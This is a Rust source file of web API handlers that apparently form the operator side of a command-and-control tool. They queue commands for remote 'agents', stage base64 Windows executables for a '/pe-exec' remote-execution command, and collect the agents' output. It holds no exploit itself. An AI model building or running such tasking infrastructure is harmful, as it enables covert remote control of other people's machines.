use crate::admin::command_formatter::CommandFormatter;
use crate::admin::models::{ApiResponse, TaskCommand};
use crate::admin::routes::AppState;
use actix_web::{
    get, post,
    web::{Data, Json, Path},
    HttpRequest, HttpResponse, Responder,
};

#[post("/api/task")]
pub async fn send_task(
    state: Data<AppState>,
    payload: Json<TaskCommand>,
    req: HttpRequest,
) -> impl Responder {
    let claims = match state.jwt_manager.authenticate(&req, &state.database) {
        Ok(c) => c,
        Err(e) => {
            return HttpResponse::Unauthorized().json(ApiResponse {
                success: false,
                message: e.to_string(),
            });
        }
    };

    let formatted_command = match CommandFormatter::format_command(&payload.command) {
        Ok(cmd) => cmd,
        Err(e) => {
            log::error!("[!] Failed to format command: {}", e);
            return HttpResponse::BadRequest().json(ApiResponse {
                success: false,
                message: format!("Invalid command format: {}", e),
            });
        }
    };

    log::info!(
        "[+] Command formatted: '{}' -> '{}'",
        payload.command,
        formatted_command
    );

    let command_id = match state
        .database
        .add_command(&payload.agent_id, &formatted_command)
    {
        Ok(id) => {
            log::info!(
                "[+] Command {} queued for agent {} by user {}",
                id,
                payload.agent_id,
                claims.sub
            );
            id
        }
        Err(e) => {
            log::error!("[!] Failed to add command to database: {}", e);
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to queue task: {}", e),
            });
        }
    };

    if payload.command.trim().starts_with("/pe-exec ") {
        log::info!("[+] PE-exec command detected, storing PE data...");

        match CommandFormatter::prepare_pe_exec_data(&payload.command) {
            Ok(pe_data_b64) => {
                log::info!(
                    "[+] PE-exec data prepared | size={} bytes | command_id={}",
                    pe_data_b64.len(),
                    command_id
                );

                match state.database.store_pe_exec_data(command_id, &pe_data_b64) {
                    Ok(()) => {
                        log::info!(
                            "[+] PE-exec data stored for command {} | size={} bytes",
                            command_id,
                            pe_data_b64.len()
                        );
                    }
                    Err(e) => {
                        log::error!(
                            "[!] Failed to store PE-exec data for command {}: {}",
                            command_id,
                            e
                        );
                    }
                }
            }
            Err(e) => {
                log::error!(
                    "[!] Failed to prepare PE-exec data for command {}: {}",
                    command_id,
                    e
                );

                return HttpResponse::BadRequest().json(ApiResponse {
                    success: false,
                    message: format!("Failed to prepare PE data: {}", e),
                });
            }
        }
    }

    if let Err(e) = state.database.log_agent_action(
        &payload.agent_id,
        "task_sent",
        Some(&payload.command),
        Some(&claims.sub),
    ) {
        log::warn!("[!] Failed to log agent action: {}", e);
    }

    HttpResponse::Ok().json(ApiResponse {
        success: true,
        message: format!(
            "Task queued for agent {} (ID: {})",
            payload.agent_id, command_id
        ),
    })
}

#[get("/api/results/{agent_id}")]
pub async fn get_results(
    state: Data<AppState>,
    agent_id: Path<String>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let agent_id = agent_id.into_inner();

    match state.database.get_agent_results(&agent_id) {
        Ok(results) => {
            log::info!(
                "[+] Retrieved {} result(s) for agent {}",
                results.len(),
                agent_id
            );

            let formatted_results: Vec<serde_json::Value> = results
                .iter()
                .map(|(id, cmd_id, output, success, types, received_at)| {
                    serde_json::json!({
                        "id": id,
                        "command_id": cmd_id,
                        "output": output,
                        "success": success,
                        "types": types,
                        "received_at": received_at
                    })
                })
                .collect();

            HttpResponse::Ok().json(formatted_results)
        }
        Err(e) => {
            log::error!("[!] Failed to get results for agent {}: {}", agent_id, e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to retrieve results: {}", e),
            })
        }
    }
}
